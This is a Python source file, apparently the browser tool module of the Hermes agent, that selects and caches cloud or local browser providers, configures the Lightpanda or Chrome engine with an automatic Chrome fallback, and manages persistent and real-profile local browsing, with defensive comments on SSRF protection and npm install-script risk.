    "browserbase": BrowserbaseProvider,
    "browser-use": BrowserUseProvider,
    "firecrawl": FirecrawlProvider,
}
# Frozen copy of the import-time _PROVIDER_REGISTRY, used by
# ``_is_legacy_provider_registry_overridden`` to detect test-time
# monkeypatching. NEVER mutate this dict.
_DEFAULT_PROVIDER_REGISTRY: Dict[str, type] = dict(_PROVIDER_REGISTRY)

_cached_cloud_provider: Optional[CloudBrowserProvider] = None
_cloud_provider_resolved = False
_cached_cloud_provider_scope: Optional[str] = None
_cached_cloud_providers: Dict[
    tuple[str, tuple[int, int]], Optional[CloudBrowserProvider]
] = {}
_cloud_provider_cache_lock = threading.RLock()
_allow_private_urls_resolved = False
_cached_allow_private_urls: Optional[bool] = None
_cached_agent_browser: Optional[str] = None
_agent_browser_resolved = False

# Lightpanda engine support — cached like _get_cloud_provider().
# agent-browser v0.25.3+ supports ``--engine lightpanda`` natively.
_cached_browser_engine: Optional[str] = None
_browser_engine_resolved = False


def _is_legacy_provider_registry_overridden() -> bool:
    """Return True when a test has patched ``_PROVIDER_REGISTRY`` to a custom value.

    Detected by spotting any registered class that *isn't* the canonical
    plugin-backed class for that name. Tests that
    ``monkeypatch.setattr(browser_tool, "_PROVIDER_REGISTRY", ...)`` install
    custom factories (`exploding_factory`, `lambda: fake_provider`, etc.);
    those entries fail the canonical-class identity check below.

    Note: a future maintainer adding a 4th built-in provider only needs to
    extend ``_DEFAULT_PROVIDER_REGISTRY`` below — they do NOT need to update
    a hardcoded set of keys here. The detection just compares each registered
    value against the corresponding canonical class.
    """
    try:
        for key, default_cls in _DEFAULT_PROVIDER_REGISTRY.items():
            if _PROVIDER_REGISTRY.get(key) is not default_cls:
                return True
        # Extra keys not in the default registry → also an override.
        return len(_PROVIDER_REGISTRY) != len(_DEFAULT_PROVIDER_REGISTRY)
    except Exception:
        return False


def _ensure_browser_plugins_loaded() -> None:
    """Idempotently trigger plugin discovery so the browser registry is populated.

    Normally `model_tools` is imported early in any session and that
    triggers `discover_plugins()` as a side effect. But `_get_cloud_provider`
    can be called from contexts that haven't gone through `model_tools` —
    standalone scripts, certain unit-test paths, the parity-sweep harness.
    Make discovery idempotent and side-effect-only here so users always
    see registered plugins regardless of import order. Cheap: subsequent
    calls early-return inside `_ensure_plugins_discovered`.
    """
    try:
        from hermes_cli.plugins import _ensure_plugins_discovered

        _ensure_plugins_discovered()
    except Exception as exc:
        logger.debug("Browser plugin discovery failed (non-fatal): %s", exc)


def _get_cloud_provider() -> Optional[CloudBrowserProvider]:
    """Return the provider cached for the active Hermes profile."""
    global _cached_cloud_provider, _cloud_provider_resolved
    global _cached_cloud_provider_scope

    scope = hermes_home_key()
    with _cloud_provider_cache_lock:
        # Tests and legacy reset paths clear the boolean. Treat that as a full
        # reset even if a previous scoped resolution remains mirrored here.
        if not _cloud_provider_resolved:
            _cached_cloud_provider_scope = None
            _cached_cloud_providers.clear()
        while True:
            before_generation = _browser_registry_generation(scope=scope)
            cache_key = (scope, before_generation)
            if cache_key in _cached_cloud_providers:
                _cached_cloud_provider = _cached_cloud_providers[cache_key]
                _cloud_provider_resolved = True
                _cached_cloud_provider_scope = scope
                return _cached_cloud_provider

            _cached_cloud_provider = None
            _cloud_provider_resolved = False
            resolved = _resolve_cloud_provider_uncached()
            after_generation = _browser_registry_generation(scope=scope)
            if before_generation != after_generation:
                # A force reload replaced/unloaded this profile's provider
                # while resolution was in progress. Discard the stale result
                # and resolve against the new registry generation.
                continue
            if _cloud_provider_resolved:
                _cached_cloud_provider_scope = scope
                for stale_key in [
                    key for key in _cached_cloud_providers if key[0] == scope
                ]:
                    _cached_cloud_providers.pop(stale_key, None)
                _cached_cloud_providers[cache_key] = resolved
            return resolved


def _resolve_cloud_provider_uncached() -> Optional[CloudBrowserProvider]:
    """Return the configured cloud browser provider, or None for local mode.

    Reads ``config["browser"]["cloud_provider"]`` once and caches the result
    for the process lifetime. An explicit ``local`` provider disables cloud
    fallback. If unset, fall back to Browser Use (managed Nous gateway or
    direct API key) and then Browserbase (direct credentials only) — the
    historic auto-detect order, now expressed as the
    :data:`agent.browser_registry._LEGACY_PREFERENCE` walk.

    Selection routes through :mod:`agent.browser_registry` so third-party
    browser plugins (``~/.hermes/plugins/browser/<vendor>/``) participate
    in explicit-config resolution. Test fixtures that override
    ``_PROVIDER_REGISTRY`` or ``BrowserUseProvider`` / ``BrowserbaseProvider``
    on this module still drive the function — see
    ``_is_legacy_provider_registry_overridden``.
    """
    global _cached_cloud_provider, _cloud_provider_resolved

    resolved: Optional[CloudBrowserProvider] = None
    provider_key = None
    try:
        from hermes_cli.config import read_raw_config
        cfg = read_raw_config()
        browser_cfg = cfg.get("browser", {})
        if isinstance(browser_cfg, dict) and "cloud_provider" in browser_cfg:
            provider_key = normalize_browser_cloud_provider(
                browser_cfg.get("cloud_provider")
            )
            if provider_key in ("local", "camofox"):
                # Camofox runs through the built-in browser tools
                # (is_camofox_mode() dispatch), not a cloud provider.
                _cached_cloud_provider = None
                _cloud_provider_resolved = True
                return None
            if provider_key == "nous":
                # Managed "Nous Subscription" selection is serviced by the
                # Browser Use provider, whose config resolver routes it
                # through the managed browser-use gateway.
                provider_key = "browser-use"
        if provider_key:
            try:
                if _is_legacy_provider_registry_overridden():
                    # Test fixture path: honour the patched dict so the
                    # cache-policy unit tests keep working.
                    factory = _PROVIDER_REGISTRY.get(provider_key)
                    if factory is not None:
                        resolved = factory()
                else:
                    # Ensure plugins are discovered so the registry is
                    # populated. Idempotent — cheap on subsequent calls.
                    _ensure_browser_plugins_loaded()
                    resolved = _registry_get_browser_provider(provider_key)
                if resolved is None:
                    # Strict selection: a stored-but-unregistered name is an
                    # honest error, never a silent reroute to auto-detect.
                    from tools.tool_backend_helpers import selection_error

                    raise ValueError(selection_error(
                        "browser",
                        f"'{provider_key}'",
                        "no registered browser plugin has that name (install "
                        "the corresponding plugin or fix the config key "
                        "spelling)",
                    ))
            except ValueError:
                raise
            except Exception:
                logger.warning(
                    "Failed to instantiate explicit cloud_provider %r; will retry on next call",
                    provider_key,
                    exc_info=True,
                )
                return None
    except ValueError:
        raise
    except Exception as e:
        # Config file may be temporarily unreadable; still try auto-detect so
        # env-based / managed-gateway credentials can resolve. Don't pin cache.
        logger.debug("Could not read cloud_provider from config: %s", e)

    if resolved is None and provider_key is None:
        # Auto-detect path — permitted ONLY when no cloud_provider selection
        # was ever written: Browser Use first (managed Nous gateway or
        # direct API key), then Browserbase (direct credentials). Uses
        # the legacy class names imported at the top of this module so
        # tests that ``monkeypatch.setattr(browser_tool, "BrowserUseProvider", ...)``
        # keep driving this branch deterministically. Third-party browser
        # plugins are intentionally NOT reachable from auto-detect — they
        # participate only via explicit ``browser.cloud_provider: <name>``,
        # mirroring the firecrawl gate documented on
        # :data:`agent.browser_registry._LEGACY_PREFERENCE`.
        try:
            fallback_provider = BrowserUseProvider()
            if fallback_provider.is_configured():
                resolved = fallback_provider
            else:
                fallback_provider = BrowserbaseProvider()
                if fallback_provider.is_configured():
                    resolved = fallback_provider
        except Exception:  # pragma: no cover - defensive: never poison cache
            logger.debug("Cloud provider auto-detect failed", exc_info=True)
            return None

    if resolved is None:
        # Transient None — credentials may self-heal. Don't poison the cache.
        return None

    _cached_cloud_provider = resolved
    _cloud_provider_resolved = True
    return _cached_cloud_provider


from hermes_constants import is_termux as _is_termux_environment


def _browser_install_hint() -> str:
    if _is_termux_environment():
        return "npm install -g agent-browser && agent-browser install"
    return "npm install -g agent-browser && agent-browser install --with-deps"


# Sentinel _find_agent_browser returns/caches to mean "resolve via npx" rather
# than a concrete executable path. A named constant + predicate keep the six
# comparison sites (four here, plus hermes_cli/tools_config.py and
# hermes_cli/doctor.py) from drifting if the sentinel's exact spelling ever
# changes.
NPX_AGENT_BROWSER_SENTINEL = "npx agent-browser"

# Pinned to match scripts/install.sh / scripts/install.ps1's
# "agent-browser@^0.26.0" managed install so a git-clone install resolving
# agent-browser via bare npx gets the same version as a managed install,
# instead of floating latest with no integrity check. Update both together.
AGENT_BROWSER_NPX_SPEC = "agent-browser@^0.26.0"


def _is_npx_agent_browser_sentinel(browser_cmd: str) -> bool:
    return browser_cmd.strip() == NPX_AGENT_BROWSER_SENTINEL


def _requires_real_termux_browser_install(browser_cmd: str) -> bool:
    return _is_termux_environment() and _is_local_mode() and _is_npx_agent_browser_sentinel(browser_cmd)


def _termux_browser_install_error() -> str:
    return (
        "Local browser automation on Termux cannot rely on the bare npx fallback. "
        f"Install agent-browser explicitly first: {_browser_install_hint()}"
    )


def _is_local_mode() -> bool:
    """Return True when the browser tool will use a local browser backend."""
    if _get_cdp_override_raw():
        return False
    return _get_cloud_provider() is None


def _is_local_backend() -> bool:
    """Return True when the browser runs locally AND the terminal is also local.

    SSRF protection is only meaningful for cloud backends (Browserbase,
    BrowserUse) where the agent could reach internal resources on a remote
    machine.  For local backends — Camofox, or the built-in headless
    Chromium without a cloud provider — the user already has full terminal
    and network access on the same machine, so the check adds no security
    value.

    However, when the terminal runs in a container (docker, modal, daytona,
    ssh, singularity), the browser on the host can access internal networks
    that the terminal cannot.  In this case, SSRF protection should be
    enabled even though the browser is technically "local".
    """
    # A CDP override points the browser at a separate Chrome process whose
    # network position is not guaranteed to match the terminal (it may live
    # off-host). Don't treat it as a trusted local backend — otherwise a
    # model-driven navigate could reach internal/metadata services reachable
    # from the CDP host but not the terminal. This MUST be checked before the
    # camofox short-circuit below so a Camofox backend combined with a CDP
    # override still fails the local check instead of returning local and
    # skipping the private/internal SSRF gate. The override is honored from
    # either the BROWSER_CDP_URL env var or a persistent `browser.cdp_url`
    # config (both via _get_cdp_override(), and both now suppress camofox in
    # browser_camofox.py). _is_local_mode() already treats any CDP override as
    # non-local; keep the two helpers in agreement.
    if _get_cdp_override_raw():
        return False
    if _is_camofox_mode():
        return True
    if _get_cloud_provider() is not None:
        return False
    # When terminal runs in a container, browser on host can access
    # internal networks the terminal can't → treat as non-local.
    # Scope-aware: under gateway multiplexing the routed profile's backend
    # lives in the per-turn terminal scope, not the process env (#68559).
    from tools.terminal_scope import terminal_env

    terminal_backend = terminal_env("TERMINAL_ENV", "local").strip().lower()
    return terminal_backend in ("local", "")


_auto_local_for_private_urls_resolved = False
_cached_auto_local_for_private_urls: bool = True


def _get_browser_engine() -> str:
    """Return the configured browser engine (``auto``, ``lightpanda``, or ``chrome``).

    Reads ``config["browser"]["engine"]`` once and caches the result.
    Falls back to the ``AGENT_BROWSER_ENGINE`` env var, then ``auto``.

    ``auto`` means: don't pass ``--engine`` at all (agent-browser defaults to
    Chrome).  ``lightpanda`` or ``chrome`` are forwarded as
    ``--engine <value>`` to agent-browser v0.25.3+.

    Lightpanda is 1.3-5.8x faster on navigation but has no graphical
    renderer (no screenshots).
    """
    global _cached_browser_engine, _browser_engine_resolved
    if _browser_engine_resolved:
        return _cached_browser_engine

    _browser_engine_resolved = True
    _cached_browser_engine = "auto"  # safe default

    # Config file takes priority
    try:
        from hermes_cli.config import read_raw_config
        cfg = read_raw_config()
        val = cfg.get("browser", {}).get("engine")
        if val and str(val).strip():
            _cached_browser_engine = str(val).strip().lower()
    except Exception as e:
        logger.debug("Could not read browser.engine from config: %s", e)

    # Fall back to env var (only if config didn't set a value)
    if _cached_browser_engine == "auto":
        env_val = os.environ.get("AGENT_BROWSER_ENGINE", "").strip().lower()
        if env_val:
            _cached_browser_engine = env_val

    # Validate: agent-browser only accepts "chrome" and "lightpanda".
    _VALID_ENGINES = {"auto", "lightpanda", "chrome"}
    if _cached_browser_engine not in _VALID_ENGINES:
        logger.warning(
            "Unknown browser engine %r (valid: %s), falling back to 'auto'",
            _cached_browser_engine, ", ".join(sorted(_VALID_ENGINES)),
        )
        _cached_browser_engine = "auto"

    return _cached_browser_engine


_cached_headed_mode: Optional[bool] = None
_headed_mode_resolved = False


def _is_headed_mode() -> bool:
    """Return True when the browser should launch in headed (visible) mode.

    Reads ``config["browser"]["headed"]`` with ``AGENT_BROWSER_HEADED`` env
    var as fallback.  Result is cached after the first call.
    """
    global _cached_headed_mode, _headed_mode_resolved
    if _headed_mode_resolved:
        return _cached_headed_mode  # type: ignore[return-value]

    _headed_mode_resolved = True
    _cached_headed_mode = False

    try:
        from hermes_cli.config import read_raw_config
        cfg = read_raw_config()
        val = cfg.get("browser", {}).get("headed")
        if val is not None:
            _cached_headed_mode = str(val).strip().lower() in ("true", "1", "yes")
    except Exception as e:
        logger.debug("Could not read browser.headed from config: %s", e)

    if not _cached_headed_mode:
        env_val = os.environ.get("AGENT_BROWSER_HEADED", "").strip()
        if env_val and env_val.lower() in ("true", "1", "yes"):
            _cached_headed_mode = True

    return _cached_headed_mode


def _should_inject_engine(engine: str) -> bool:
    """Return True when the engine flag should be added to agent-browser commands.

    Only inject ``--engine`` for non-cloud, non-camofox local sessions where
    the engine is explicitly set (not ``auto``).
    """
    if engine == "auto":
        return False
    if _is_camofox_mode():
        return False
    return _is_local_mode()


_local_browser_settings_resolved = False
_cached_local_browser_settings: Dict[str, Any] = {}


def _get_local_browser_settings() -> Dict[str, Any]:
    """Return the ``browser.local`` config block (cached).

    Controls the persistent-profile local backend (hermes-mods):

    * ``profile_dir`` — Chromium user-data directory.  When set, local
      sessions stop using ephemeral ``h_<uuid>`` names and instead share one
      fixed agent-browser session backed by this profile, so cookies and
      logins survive daemon and Hermes restarts.
    * ``headed`` — launch with a visible window (``--headed``).  When no
      DISPLAY is available agent-browser falls back to Xvfb automatically.
    * ``session_name`` — fixed agent-browser session name (default ``hermes``).
    * ``viewport`` — ``"WxH"`` re-applied after every ``open`` so pages always
      render at the same aspect ratio regardless of window-manager sizing.
    """
    global _local_browser_settings_resolved, _cached_local_browser_settings
    if _local_browser_settings_resolved:
        return _cached_local_browser_settings

    settings: Dict[str, Any] = {
        "profile_dir": None,
        "headed": False,
        "session_name": "hermes",
        "viewport": None,
    }
    try:
        from hermes_cli.config import read_raw_config
        block = (read_raw_config().get("browser", {}) or {}).get("local", {}) or {}
        profile_dir = str(block.get("profile_dir") or "").strip()
        if profile_dir:
            settings["profile_dir"] = os.path.expanduser(profile_dir)
        settings["headed"] = bool(block.get("headed", False))
        session_name = str(block.get("session_name") or "").strip()
        if session_name:
            settings["session_name"] = session_name
        viewport = str(block.get("viewport") or "").strip().lower()
        if viewport:
            try:
                w, h = (int(p) for p in viewport.split("x", 1))
                if w > 0 and h > 0:
                    settings["viewport"] = (w, h)
            except (ValueError, TypeError):
                logger.warning("Invalid browser.local.viewport %r (want WxH)", viewport)
    except Exception as e:
        logger.debug("Could not read browser.local config: %s", e)

    _cached_local_browser_settings = settings
    _local_browser_settings_resolved = True
    return settings


def _local_persistent_profile_dir() -> Optional[str]:
    """Profile dir for the persistent local backend, or None when unset."""
    return _get_local_browser_settings()["profile_dir"]


def _using_lightpanda_engine() -> bool:
    """Return True when local browser commands are configured for Lightpanda."""
    return _get_browser_engine() == "lightpanda"


def lightpanda_engine_status() -> Tuple[bool, str]:
    """Whether ``browser.engine: lightpanda`` is actually in effect, and why.

    Returns ``(False, "")`` when the engine is not lightpanda. Otherwise the
    reason names the setting that shadows it (a cloud provider, Camofox, a
    CDP override, Browser Use cloud, the real-profile toggle) or, when it is
    in use, which driver runs it. Mirrors the precedence of
    ``_should_inject_engine`` (built-in tools) and
    ``browser_use_cli._resolve_backend_cdp`` (Browser Use mode) using gates
    that do no network I/O (config reads only), so ``/browser status`` and
    ``hermes doctor`` can call it.
    """
    if not _using_lightpanda_engine():
        return False, ""
    if _get_cdp_override_raw():
        return False, "a CDP override is active (/browser connect or browser.cdp_url)"
    if _is_camofox_mode():
        return False, "Camofox is the selected browser (CAMOFOX_URL)"
    # Real-profile is checked before the cloud provider: in browser_exec the
    # real-profile resolution runs before backend resolution, so with both
    # set it is the real-profile toggle that actually claims the session.
    if _use_real_profile():
        return False, "browser.use_real_profile is on (Lightpanda cannot load a Chromium profile)"
    try:
        provider = _get_cloud_provider()
    except Exception:
        provider = None
    if provider is not None:
        try:
            name = provider.provider_name()
        except Exception:
            name = type(provider).__name__
        return False, (
            f"cloud provider {name} is selected (browser.cloud_provider, or "
            "auto-detected from credentials)"
        )
    bu_mode = _is_browser_use_cli_mode()
    if bu_mode:
        try:
            from tools.browser_use_cli import (
                _read_browser_cfg,
                is_legacy_browser_use_cloud_config,
            )

            if is_legacy_browser_use_cloud_config(_read_browser_cfg()):
                return False, "Browser Use cloud (BROWSER_USE_API_KEY) is selected"
        except Exception as e:
            logger.debug("legacy Browser Use cloud check failed: %s", e)
    if bu_mode:
        return True, "Browser Use mode: Hermes spawns `lightpanda serve` per session"
    return True, "built-in browser tools: agent-browser --engine lightpanda"


def _lightpanda_fallback_reason(engine: str, command: str, result: Dict[str, Any]) -> Optional[str]:
    """Return the user-visible reason a Lightpanda result needs Chrome fallback.

    ``None`` means no fallback should run.  The returned string is copied into
    the fallback result so CLI/TUI/gateway users can see when Hermes silently
    switched from Lightpanda to Chrome for completeness.
    """
    if engine != "lightpanda":
        return None

    # Only retry commands where Chrome can meaningfully produce a different
    # result. Session-management commands (close, record) are tied to the
    # engine's daemon and can't be retried on a different engine.
    _FALLBACK_ELIGIBLE = {"open", "snapshot", "screenshot", "eval", "click",
                          "fill", "scroll", "back", "press", "console", "errors"}
    if command not in _FALLBACK_ELIGIBLE:
        return None

    # Explicit failure
    if not result.get("success"):
        error = str(result.get("error") or "command failed").strip()
        return f"Lightpanda {command!r} failed ({error}); retried with Chrome."

    data = result.get("data", {})

    if command == "snapshot":
        snap = data.get("snapshot", "")
        # Empty or near-empty snapshots indicate Lightpanda couldn't render
        if not snap or len(snap.strip()) < 20:
            return "Lightpanda returned an empty/too-short snapshot; retried with Chrome."

    if command == "screenshot":
        # Lightpanda returns a placeholder PNG with its panda logo.
        # Since LP PR #1766 resized it to 1920x1080, the placeholder is
        # ~17 KB.  Real Chromium screenshots are typically 100 KB+.
        path = data.get("path", "")
        if path:
            try:
                size = os.path.getsize(path)
                if size < 20480:
                    logger.debug("Lightpanda screenshot is suspiciously small (%d bytes), "
                                 "triggering Chrome fallback", size)
                    return (
                        f"Lightpanda screenshot was suspiciously small ({size} bytes); "
                        "retried with Chrome."
                    )
            except OSError:
                return "Lightpanda screenshot file was missing/unreadable; retried with Chrome."

    return None


def _needs_lightpanda_fallback(engine: str, command: str, result: Dict[str, Any]) -> bool:
    """Check if a Lightpanda result should trigger an automatic Chrome fallback."""
    return _lightpanda_fallback_reason(engine, command, result) is not None


def _annotate_lightpanda_fallback(result: Dict[str, Any], reason: str) -> Dict[str, Any]:
    """Add a user-visible Chrome fallback warning to a browser command result."""
    warning = (
        "⚠ Lightpanda fallback: Chrome was used for this browser action. "
        f"{reason}"
    )
    annotated = dict(result)
    annotated["fallback_warning"] = warning
    annotated["browser_engine"] = "chrome"
    annotated["browser_engine_fallback"] = {
        "from": "lightpanda",
        "to": "chrome",
        "reason": reason,
    }
    data = annotated.get("data")
    if isinstance(data, dict):
        data = dict(data)
        data.setdefault("fallback_warning", warning)
        data.setdefault("browser_engine", "chrome")
        data.setdefault(
            "browser_engine_fallback",
            {"from": "lightpanda", "to": "chrome", "reason": reason},
        )
        annotated["data"] = data
    return annotated


def _copy_fallback_warning(target: Dict[str, Any], result: Dict[str, Any]) -> Dict[str, Any]:
    """Copy browser fallback metadata from an internal result into a tool response."""
    if result.get("fallback_warning"):
        target["fallback_warning"] = result["fallback_warning"]
        target["browser_engine"] = result.get("browser_engine")
        target["browser_engine_fallback"] = result.get("browser_engine_fallback")
    return target


def _run_chrome_fallback_command(
    task_id: str,
    command: str,
    args: List[str],
    timeout: int,
) -> Dict[str, Any]:
    """Run a browser command in a temporary Chrome session at the current URL.

    agent-browser locks the engine when a named daemon starts. Passing
    ``--engine chrome`` to the same Lightpanda ``--session`` cannot change that
    running daemon. This helper always uses a fresh temporary Chrome session,
    navigates it to the current Lightpanda URL, runs ``command``, then tears it
    down.
    """
    import uuid

    # 1. Grab the current URL from the Lightpanda session. ``get url`` is not
    # fallback-eligible, so an error cannot recursively trigger this helper.
    # Keep the explicit Lightpanda override so Chromium-only environment flags
    # are stripped while querying the already-running Lightpanda daemon.
    url_result = _run_browser_command(
        task_id, "get", ["url"], timeout=10, _engine_override="lightpanda"
    )
    current_url = None
    if url_result.get("success"):
        current_url = str(url_result.get("data", {}).get("url", "")).strip()
    if not current_url:
        logger.warning("Chrome fallback: could not determine current URL from LP session")
        return {"success": False, "error": "Chrome fallback failed: could not determine current URL"}

    # 2. Create a temporary Chrome session (bypasses _get_session_info's cache).
    tmp_session = f"h_cfb_{uuid.uuid4().hex[:8]}"
    try:
        browser_cmd = _find_agent_browser()
    except FileNotFoundError as e:
        return {"success": False, "error": str(e)}

    if not _chromium_installed():
        if _running_in_docker():
            hint = (
                "Chrome fallback requires Chromium, but it is missing. "
                "You're running in Docker — pull the latest image: "
                "docker pull ghcr.io/nousresearch/hermes-agent:latest"
            )
        else:
            hint = (
                "Chrome fallback requires Chromium, but it is missing. Install it with: "
                "npx agent-browser install --with-deps "
                "(or: npx playwright install --with-deps chromium)"
            )
        return {"success": False, "error": hint}

    # Resolve npx via the same PATH + extended-PATH cascade _find_agent_browser
    # uses, not a bare shutil.which("npx") — Hermes-managed-Node-only setups
    # resolve npx only through the extended fallback path, and a bare lookup
    # would let a broken system npx shadow a healthy managed one. If npx isn't
    # found at all (Termux, bare container), fall back to the bare name and
    # let Popen raise with a readable "FileNotFoundError: 'npx'" rather than
    # WinError 193.
    if _is_npx_agent_browser_sentinel(browser_cmd):
        _npx_bin = _resolve_npx_bin() or "npx"
        # --ignore-scripts: AGENT_BROWSER_NPX_SPEC is a floating ^0.26.0 range,
        # not an exact pin — a compromised future 0.26.x patch must not get to
        # run its own install-time lifecycle scripts on this machine.
        cmd_prefix = [_npx_bin, "--ignore-scripts", "--prefer-offline", "-y", AGENT_BROWSER_NPX_SPEC]
    else:
        cmd_prefix = [browser_cmd]
    base_args = cmd_prefix + ["--engine", "chrome", "--session", tmp_session, "--json"]

    task_socket_dir = os.path.join(_socket_safe_tmpdir(), f"agent-browser-{tmp_session}")
    os.makedirs(task_socket_dir, mode=0o700, exist_ok=True)
    # Claim the dir before using it: another hermes process's orphan reaper
    # rmtree's any agent-browser-* dir in the shared tmpdir that carries no
    # live owner, which otherwise deletes this one mid-command.
    _write_owner_pid(task_socket_dir, tmp_session)
    browser_env = _build_browser_env()
    browser_env["AGENT_BROWSER_SOCKET_DIR"] = task_socket_dir
    browser_env["PATH"] = _merge_browser_path(browser_env.get("PATH", ""))

    if "AGENT_BROWSER_IDLE_TIMEOUT_MS" not in browser_env:
        browser_env["AGENT_BROWSER_IDLE_TIMEOUT_MS"] = str(BROWSER_SESSION_INACTIVITY_TIMEOUT * 1000)

    # This helper bypasses _run_browser_command, so apply the same Chromium
    # sandbox policy explicitly.
    _apply_chromium_sandbox_args(browser_env)

    def _run_tmp(cmd: str, cmd_args: List[str]) -> Dict[str, Any]:
        full = base_args + [cmd] + cmd_args
        # Use temp-file stdout/stderr pattern (same as _run_browser_command)
        # to avoid pipe hang from agent-browser daemon inheriting fds.
        stdout_path = os.path.join(task_socket_dir, f"_stdout_{cmd}")
        stderr_path = os.path.join(task_socket_dir, f"_stderr_{cmd}")
        stdout_fd = os.open(stdout_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        stderr_fd = os.open(stderr_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        try:
            # On Windows, launch the child in a new process group so parent
            # console Ctrl+C doesn't kill it with STATUS_CONTROL_C_EXIT
            # (0xC000013A = rc 3221225786), AND insulate its stdio + handle
            # inheritance from the parent.
            #
            # Additional Windows hardening beyond CREATE_NEW_PROCESS_GROUP:
            # * STARTF_USESTDHANDLES + explicit handles → CreateProcess hands
            #   the child ONLY our three chosen handles (DEVNULL stdin +
            #   temp-file stdout/stderr). Without this, some parents leak
            #   console handles that break downstream grandchild spawns — the
            #   agent-browser Rust binary spawns a detached daemon grandchild,
            #   and that grandchild's CreateProcess dies silently
            #   ("Daemon process exited during startup with no error output")
            #   when inherited parent handles are in a weird state. Observed
            #   in the Hermes CLI where sys.stdout and sys.stderr both report
            #   fileno=1 (stderr dup'd onto stdout at the OS level).
            # * close_fds=True → block inheritance of every other handle.
            #   (Default on POSIX; must be explicit on Windows for stdio.)
            _popen_extra: dict = {}
            if os.name == "nt":
                # CREATE_NO_WINDOW → don't attach a console (cmd.exe would
                # otherwise briefly allocate one for the .cmd shim).
                # Do NOT add CREATE_NEW_PROCESS_GROUP: on Python 3.11 Windows
                # it interacts with asyncio's ProactorEventLoop such that the
                # subprocess creation cancels the running loop task, which
                # surfaces as KeyboardInterrupt in app.run() and tears down
                # the CLI mid-turn. The agent thread's subprocess spawn
                # unwound MainThread's prompt_toolkit loop that way — see
                # diag log: "asyncio.CancelledError → KeyboardInterrupt".
                _popen_extra["creationflags"] = windows_hide_flags()
                _popen_extra["close_fds"] = True
                _si = subprocess.STARTUPINFO()
                _si.dwFlags |= subprocess.STARTF_USESTDHANDLES
                _popen_extra["startupinfo"] = _si
            proc = subprocess.Popen(
                full, stdout=stdout_fd, stderr=stderr_fd,
                stdin=subprocess.DEVNULL, env=browser_env,
                **_popen_extra,
            )
        finally:
            os.close(stdout_fd)
            os.close(stderr_fd)
        try:
            proc.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
            return {"success": False, "error": f"Chrome fallback '{cmd}' timed out"}
        try:
            with open(stdout_path, "r", encoding="utf-8") as f:
                stdout = f.read().strip()
            if stdout:
                return json.loads(stdout.split("\n")[-1])
        except Exception as exc:
            logger.debug("Chrome fallback tmp cmd '%s' error: %s", cmd, exc)
        finally:
            for pth in (stdout_path, stderr_path):
                try:
                    os.unlink(pth)
                except OSError:
                    pass
        return {"success": False, "error": f"Chrome fallback '{cmd}' failed"}

    try:
        # 3. Navigate Chrome to the same URL.
        nav = _run_tmp("open", [current_url])
        if not nav.get("success"):
            logger.warning("Chrome fallback: navigate failed: %s", nav.get("error"))
            return {"success": False, "error": f"Chrome fallback navigate failed: {nav.get('error')}"}

        # 4. Run the requested command in Chrome.
        return _run_tmp(command, args)

    finally:
        # 5. Tear down the temporary Chrome session.
        try:
            _run_tmp("close", [])
        except Exception:
            pass
        # Clean up socket directory
        import shutil as _shutil
        _shutil.rmtree(task_socket_dir, ignore_errors=True)


def _chrome_fallback_screenshot(
    task_id: str,
    args: List[str],
    timeout: int,
) -> Dict[str, Any]:
    """Take a screenshot using a temporary Chrome session."""
    return _run_chrome_fallback_command(task_id, "screenshot", args, timeout)


def _auto_local_for_private_urls() -> bool:
    """Return whether a cloud-configured install should auto-spawn a local
    Chromium for LAN/localhost URLs.

    Reads ``browser.auto_local_for_private_urls`` once (default ``True``) and
    caches it for the process lifetime.  When enabled, ``browser_navigate``
    routes URLs whose host resolves to a private/loopback/LAN address to a
    local headless Chromium sidecar even when a cloud provider (Browserbase
    / Browser-Use / Firecrawl) is configured globally.  Public URLs continue
    to use the cloud provider in the same conversation.
    """
    global _auto_local_for_private_urls_resolved, _cached_auto_local_for_private_urls
    if _auto_local_for_private_urls_resolved:
        return _cached_auto_local_for_private_urls

    _auto_local_for_private_urls_resolved = True
    try:
        from hermes_cli.config import read_raw_config
        cfg = read_raw_config()
        browser_cfg = cfg.get("browser", {})
        if isinstance(browser_cfg, dict) and "auto_local_for_private_urls" in browser_cfg:
            _cached_auto_local_for_private_urls = bool(
                browser_cfg.get("auto_local_for_private_urls")
            )
    except Exception as e:
        logger.debug("Could not read auto_local_for_private_urls from config: %s", e)
    return _cached_auto_local_for_private_urls


def _use_real_profile() -> bool:
    """Return whether the user consented to real-profile local browsing.

    Reads ``browser.use_real_profile`` (default False) on EVERY call — it is a
    consent switch, so flipping it off must take effect without a restart, and
    in a multiplexed gateway each profile's config must decide for itself.
    The read is one YAML load per local session creation (not per command),
    so there is no hot-path cost to keeping it uncached.
    """
    try:
        from hermes_cli.config import read_raw_config
        cfg = read_raw_config()
        browser_cfg = cfg.get("browser", {})
        if isinstance(browser_cfg, dict):
            return bool(browser_cfg.get("use_real_profile", False))
    except Exception as e:
        logger.debug("Could not read use_real_profile from config: %s", e)
    return False


# Session name for the single shared real-profile copy-browser. All consented
# local browsing attaches to this one agent-browser session so concurrent
# tasks reuse the same copy-browser instead of each launching a rival Chromium
# on the same copied user-data-dir.
_REAL_PROFILE_SESSION = "hermes-real-profile"
_real_profile_cdp_lock = threading.Lock()
_real_profile_cdp_cache: dict = {}
_real_profile_chrome_procs: list = []  # Popen handles of directly-launched real browsers


def _terminate_real_profile_chrome() -> None:
    """Terminate real-browser processes launched for real-profile sessions.

    The real-profile path launches the user's actual browser binary on the
    profile COPY (bypassing agent-browser's mock-keychain launch). Those
    processes are ours to reap: agent-browser only ATTACHED to them, so its
    own session cleanup never kills them. Idempotent; safe from atexit.
    """
    while _real_profile_chrome_procs:
        proc = _real_profile_chrome_procs.pop()
        try:
            if proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except Exception:
                    proc.kill()
        except Exception as e:
            logger.debug("real-profile chrome terminate failed: %s", e)


def _agent_browser_argv(browser_cmd: str) -> list:
    """Command prefix to invoke agent-browser (binary or npx sentinel)."""
    if _is_npx_agent_browser_sentinel(browser_cmd):
        _npx_bin = _resolve_npx_bin() or "npx"
        return [_npx_bin, "--ignore-scripts", "--prefer-offline", "-y", AGENT_BROWSER_NPX_SPEC]
    return [browser_cmd]


def _cdp_http_ready(http_cdp: str) -> bool:
    """True when an ``http://host:port`` CDP discovery root answers."""
    try:
        from hermes_cli.browser_connect import is_browser_debug_ready

        return is_browser_debug_ready(http_cdp, timeout=1.0)
